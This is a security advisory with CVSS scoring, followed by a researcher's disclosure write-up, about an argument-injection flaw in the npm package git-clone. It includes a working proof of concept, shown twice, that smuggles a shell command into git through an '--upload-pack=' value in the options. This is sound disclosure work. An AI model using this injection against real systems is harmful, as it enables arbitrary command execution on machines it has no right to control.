## How to fix?

There is no fixed version for `git-clone`.

## Overview

[git-clone](https://www.npmjs.org/package/git-clone) is a Clone a git repository

Affected versions of this package are vulnerable to Improper Neutralization of Argument Delimiters in a Command ('Argument Injection') due to insecure usage of the `--upload-pack` feature of git.

**Note:** A note was added to the README file of the package to only use the `args` option with static/trusted input!

## PoC:

```
const clone = require('git-clone')
const repo = 'file:///tmp/zero12345'
const path = '/tmp/example-new-repo'
const options = {
    args: [
    '--upload-pack=touch /tmp/pwn2'
]}
clone(repo, path, options)

Observe a new file created: /tmp/pwn2

```

### CVSS Scores

version 3.1
### Snyk

8.1 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  A successful attack depends on conditions beyond the attacker's control. That is, a successful attack cannot be accomplished at will, but requires the attacker to invest in some measurable amount of effort in preparation or execution against the vulnerable component before a successful attack can be expected.

  **High**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

Command Injection vulnerability in git-clone@0.2.0

 [Raw](/lirantal/9441f3a1212728476f7a6caa4acb2ccc/raw/e59cde7336f9ea5d27a0d0ce1a8b17a79ee6baf7/git-clone-command-injection.md)

[**git-clone-command-injection.md**](#file-git-clone-command-injection-md)

# Command Injection vulnerability in git-clone@0.2.0

`git-clone` describes itself as a tool to clone a git repository

Resources:

* Project's GitHub source code: <https://github.com/jaz303/git-clone>
* Project's npm package: <https://www.npmjs.com/package/git-clone>

`git-clone` receives about 230,000 downloads a week so this report should probably be timely.

## Background on exploitation

I'm reporting a Command Injection vulnerability in `git-clone` npm package.

A use of the `--upload-pack` feature of git is also supported for `git clone`, and allows users to execute arbitrary commands on the OS.

The source code attempted to mitigate user input concatenation as shown here: <https://github.com/jaz303/git-clone/blob/master/private/util.js#L16-L17> with the following:

```
	args = args.concat(userArgs);
	args.push('--', repo, targetPath);
```

However, the user arguments are first added to the command being executed, and only then the double dash is added. Effectively, creating the following array values passed to the `git` spawned command here <https://github.com/jaz303/git-clone/blob/46e27e0a60261f22ff70ed5f29d72f5d43b8aeab/private/impl.js#L10>:

```
[
  'clone',
  '--upload-pack=touch /tmp/pwn2',
  '--',
  'file:///tmp/zero12345',
  '/tmp/example-new-repo'
]

```

If a user controls the options object provided to the `clone()` function through the `options.args` array, then they can inject commands to run when the clone function is called.

## New exploit

Install `git-clone@0.2.0`, which is the latest.

Run the following code:

```
const clone = require('git-clone')
const repo = 'file:///tmp/zero12345'
const path = '/tmp/example-new-repo'
const options = {
	args: [
	'--upload-pack=touch /tmp/pwn2'
]}
clone(repo, path, options)
```

Observe a new file created: `/tmp/pwn2`
